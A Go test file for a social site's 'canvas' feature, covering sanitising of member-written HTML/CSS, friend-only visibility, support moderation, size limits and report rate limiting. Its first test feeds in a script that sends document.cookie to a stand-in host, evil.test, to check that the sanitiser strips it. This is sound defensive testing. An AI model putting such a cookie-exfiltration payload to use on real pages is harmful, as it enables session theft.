package service

import (
	"errors"
	"strings"
	"testing"

	"github.com/kurtisrogers/amici/internal/domain"
	"github.com/kurtisrogers/amici/internal/security/canvas"
)

// The sanitiser itself is tested thoroughly, including with a fuzz target, in
// internal/security/canvas. These tests are about the service around it: that
// saving stores the sanitised copy rather than the source, that the rendered
// copy is only handed to people entitled to see it, and that support switching
// somebody's page off does not touch what they wrote.

func TestSavingACanvasStoresTheSanitisedCopy(t *testing.T) {
	t.Parallel()
	h := newHarness(t)

	rosa := h.member("rosa")
	res, err := h.svc.Canvas.Save(h.ctx, rosa, CanvasDraft{
		HTML: `<marquee>welcome</marquee><script>fetch('https://evil.test/'+document.cookie)</script>`,
		CSS:  `h1 { color: hotpink; background-image: url(https://evil.test/pixel.png); }`,
	})
	if err != nil {
		t.Fatalf("save: %v", err)
	}

	// The nostalgia survives.
	if !strings.Contains(res.Canvas.HTMLRendered, "<marquee>") {
		t.Errorf("the marquee was removed: %q", res.Canvas.HTMLRendered)
	}
	if !strings.Contains(res.Canvas.CSSRendered, "hotpink") {
		t.Errorf("the colour was removed: %q", res.Canvas.CSSRendered)
	}

	// The attacks do not.
	if strings.Contains(res.Canvas.HTMLRendered, "script") {
		t.Errorf("script survived sanitising: %q", res.Canvas.HTMLRendered)
	}
	if strings.Contains(res.Canvas.CSSRendered, "evil.test") {
		t.Errorf("a remote url survived sanitising: %q", res.Canvas.CSSRendered)
	}

	// The source is kept exactly as typed, so the editor can show it back.
	if !strings.Contains(res.Canvas.HTMLSource, "<script>") {
		t.Error("the source was rewritten; the editor would show the member something they did not type")
	}

	// And the member is told what happened, rather than left wondering why
	// half their page vanished.
	if len(res.Notices) == 0 {
		t.Error("nothing was explained to the member")
	}

	if res.Canvas.SanitiserVersion != canvas.Version {
		t.Errorf("stored sanitiser version = %d, want %d", res.Canvas.SanitiserVersion, canvas.Version)
	}
}

func TestOnlyFriendsCanSeeARenderedCanvas(t *testing.T) {
	t.Parallel()
	h := newHarness(t)

	rosa := h.member("rosa")
	teo := h.member("teo")
	stranger := h.member("bruno")
	h.befriend(rosa, teo)

	if _, err := h.svc.Canvas.Save(h.ctx, rosa, CanvasDraft{HTML: "<center>hello</center>"}); err != nil {
		t.Fatalf("save: %v", err)
	}

	if _, _, err := h.svc.Canvas.Rendered(h.ctx, teo, "rosa"); err != nil {
		t.Errorf("a friend cannot see the canvas: %v", err)
	}
	if _, _, err := h.svc.Canvas.Rendered(h.ctx, rosa, "rosa"); err != nil {
		t.Errorf("a member cannot see their own canvas: %v", err)
	}
	if _, _, err := h.svc.Canvas.Rendered(h.ctx, stranger, "rosa"); !errors.Is(err, domain.ErrNotFound) {
		t.Errorf("a stranger reading the canvas: want not found, got %v", err)
	}
}

func TestDisablingACanvasStopsItRenderingWithoutEditingIt(t *testing.T) {
	t.Parallel()
	h := newHarness(t)

	rosa := h.member("rosa")
	teo := h.member("teo")
	support := h.account("help-desk", domain.RoleSupport, 1985)
	h.befriend(rosa, teo)

	if _, err := h.svc.Canvas.Save(h.ctx, rosa, CanvasDraft{
		HTML: "<center>a page somebody complained about</center>",
	}); err != nil {
		t.Fatalf("save: %v", err)
	}
	if err := h.svc.Support.SetCanvasDisabled(h.ctx, support, rosa.ID, true, "reported for impersonation"); err != nil {
		t.Fatalf("disable: %v", err)
	}

	// Reload, because the account the viewer carries is the one the rule is
	// read from.
	rosa, err := h.svc.Accounts.Reload(h.ctx, rosa.ID)
	if err != nil {
		t.Fatalf("reload: %v", err)
	}
	if !rosa.CanvasDisabled {
		t.Fatal("the account does not show its canvas as disabled")
	}

	stored, _, err := h.svc.Canvas.Rendered(h.ctx, teo, "rosa")
	if err == nil && !stored.Empty() {
		t.Error("a disabled canvas still rendered to a friend")
	}

	// The member's own markup is untouched. Nobody at Amici edits somebody
	// else's page: it either renders or it does not.
	draft, err := h.svc.Canvas.Draft(h.ctx, rosa)
	if err != nil {
		t.Fatalf("draft: %v", err)
	}
	if !strings.Contains(draft.HTMLSource, "a page somebody complained about") {
		t.Errorf("the member's source was altered: %q", draft.HTMLSource)
	}
}

func TestClearingACanvasLeavesEverythingElseAlone(t *testing.T) {
	t.Parallel()
	h := newHarness(t)

	rosa := h.member("rosa")
	h.post(rosa, "a post that should survive", domain.VisibilityFriends)
	if _, err := h.svc.Canvas.Save(h.ctx, rosa, CanvasDraft{HTML: "<center>hello</center>"}); err != nil {
		t.Fatalf("save: %v", err)
	}

	if err := h.svc.Canvas.Clear(h.ctx, rosa); err != nil {
		t.Fatalf("clear: %v", err)
	}

	draft, err := h.svc.Canvas.Draft(h.ctx, rosa)
	if err != nil {
		t.Fatalf("draft: %v", err)
	}
	if !draft.Empty() || draft.HTMLSource != "" {
		t.Errorf("the canvas was not cleared: %+v", draft)
	}

	feed, err := h.svc.Feed.Home(h.ctx, rosa, "")
	if err != nil {
		t.Fatalf("feed: %v", err)
	}
	if !contains(bodies(feed), "a post that should survive") {
		t.Error("clearing a canvas removed the member's posts")
	}
}

func TestOversizedCanvasesAreRefused(t *testing.T) {
	t.Parallel()
	h := newHarness(t)

	rosa := h.member("rosa")
	_, err := h.svc.Canvas.Save(h.ctx, rosa, CanvasDraft{
		HTML: strings.Repeat("<div>padding</div>", domain.CanvasHTMLMaxLen),
	})
	if !errors.Is(err, domain.ErrValidation) {
		t.Errorf("an oversized canvas: want a validation error, got %v", err)
	}
}

func TestReRenderStaleBringsOldCanvasesUpToDate(t *testing.T) {
	t.Parallel()
	h := newHarness(t)

	rosa := h.member("rosa")
	dev := h.account("dev", domain.RoleDeveloper, 1985)

	if _, err := h.svc.Canvas.Save(h.ctx, rosa, CanvasDraft{HTML: "<center>hello</center>"}); err != nil {
		t.Fatalf("save: %v", err)
	}

	// Pretend this canvas was rendered by an older sanitiser, which is what
	// the world looks like the day after the rules are tightened.
	stored, err := h.store.CanvasForAccount(h.ctx, rosa.ID)
	if err != nil {
		t.Fatalf("read canvas: %v", err)
	}
	stored.SanitiserVersion = canvas.Version - 1
	stored.HTMLRendered = ""
	if err := h.store.SaveCanvas(h.ctx, stored); err != nil {
		t.Fatalf("age the canvas: %v", err)
	}

	diag, err := h.svc.Insights.Diagnostics(h.ctx, dev, "test")
	if err != nil {
		t.Fatalf("diagnostics: %v", err)
	}
	if diag.StaleCanvases != 1 {
		t.Fatalf("stale canvases = %d, want 1", diag.StaleCanvases)
	}

	done, err := h.svc.Canvas.ReRenderStale(h.ctx, dev, 10)
	if err != nil {
		t.Fatalf("re-render: %v", err)
	}
	if done != 1 {
		t.Errorf("re-rendered %d canvases, want 1", done)
	}

	fresh, err := h.store.CanvasForAccount(h.ctx, rosa.ID)
	if err != nil {
		t.Fatalf("read canvas again: %v", err)
	}
	if fresh.SanitiserVersion != canvas.Version {
		t.Errorf("version = %d, want %d", fresh.SanitiserVersion, canvas.Version)
	}
	if !strings.Contains(fresh.HTMLRendered, "center") {
		t.Errorf("the canvas was not re-rendered from source: %q", fresh.HTMLRendered)
	}
}

func TestReportingIsRateLimited(t *testing.T) {
	t.Parallel()
	h := newHarness(t)

	rosa := h.member("rosa")
	teo := h.member("teo")
	h.befriend(rosa, teo)
	post := h.post(teo, "something to report", domain.VisibilityFriends)

	var lastErr error
	for i := 0; i < reportsPerDay+2; i++ {
		lastErr = h.svc.Support.Report(h.ctx, rosa, NewReport{
			SubjectKind: "post",
			SubjectID:   post.ID,
			Reason:      "I am reporting this over and over again",
		})
		if lastErr != nil {
			break
		}
	}
	if !errors.Is(lastErr, domain.ErrRateLimited) {
		t.Errorf("after %d reports the error was %v, want rate limited", reportsPerDay, lastErr)
	}
}

func TestSupportSeesReportsWithoutSeeingContent(t *testing.T) {
	t.Parallel()
	h := newHarness(t)

	rosa := h.member("rosa")
	teo := h.member("teo")
	support := h.account("help-desk", domain.RoleSupport, 1985)
	h.befriend(rosa, teo)
	post := h.post(teo, "the actual words of the post", domain.VisibilityFriends)

	if err := h.svc.Support.Report(h.ctx, rosa, NewReport{
		SubjectKind: "post",
		SubjectID:   post.ID,
		Reason:      "he is being unkind about my tomatoes",
	}); err != nil {
		t.Fatalf("report: %v", err)
	}

	reports, err := h.svc.Support.OpenReports(h.ctx, support)
	if err != nil {
		t.Fatalf("open reports: %v", err)
	}
	if len(reports) != 1 {
		t.Fatalf("%d open reports, want 1", len(reports))
	}
	got := reports[0]
	if got.Report.Reason != "he is being unkind about my tomatoes" {
		t.Errorf("reason = %q", got.Report.Reason)
	}
	if got.Reporter.Handle != "rosa" {
		t.Errorf("reporter = %q, want rosa", got.Reporter.Handle)
	}

	// A report carries the reporter's description and the subject's id, and
	// nothing else. Support works from what the member wrote, which is why
	// the interface asks them to describe it properly.
	if _, err := h.svc.Feed.Thread(h.ctx, support, post.ID); !errors.Is(err, domain.ErrNotFound) {
		t.Errorf("support could read the reported post: %v", err)
	}

	if err := h.svc.Support.ResolveReport(h.ctx, support, got.Report.ID, false, "had a word"); err != nil {
		t.Fatalf("resolve: %v", err)
	}
	remaining, err := h.svc.Support.OpenReports(h.ctx, support)
	if err != nil {
		t.Fatalf("open reports again: %v", err)
	}
	if len(remaining) != 0 {
		t.Errorf("%d open reports after resolving, want 0", len(remaining))
	}
}
